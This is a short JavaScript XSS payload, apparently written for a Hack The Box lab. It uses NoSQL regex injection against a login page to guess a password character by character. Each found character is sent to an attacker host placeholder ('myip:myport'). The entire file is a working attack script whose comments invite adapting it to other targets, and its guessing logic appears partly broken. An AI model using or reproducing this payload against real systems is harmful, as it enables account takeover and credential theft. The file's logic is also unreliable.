// author: otter ʕ •ᴥ•ʔ
// 
// This XSS payload is used to leverage a NoSqli vulnerability on a website, it uses 
// a regular expression to match the password (it can also be used for a username or email)
// character by character and exifiltrate the results to the attacker.

// setup alphabet
var char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_@!?";
var valid_pass = "";
var found_char = false;

// loop through the alphabet 
for (let k = 0; k < char_set.length && !found_char; k++) {
    // setup request to the login page
    var xhr = new XMLHttpRequest();
    xhr.onload = handleResponse;
    xhr.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", true);
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
    // change the login information and format based on the website
    xhr.send(encodeURI('email=user@website.com&password[$regex]=^' + valid_pass + char_set[k] + '.*'));

    function handleResponse() {
        var response = xhr.responseText;
        // success logic is based on known website structure, change it to suite the target
        if (response.includes("2FA")) {
            var call = new XMLHttpRequest();
            call.open('get', 'http://myip:myport/?password=' + char_set[k], true);
            call.send();
            
        // based on the website's response, the found character
        // is added to the final password
        } else if (response.includes("Invalid password")) {
            found_char = true;
        }
    };
}
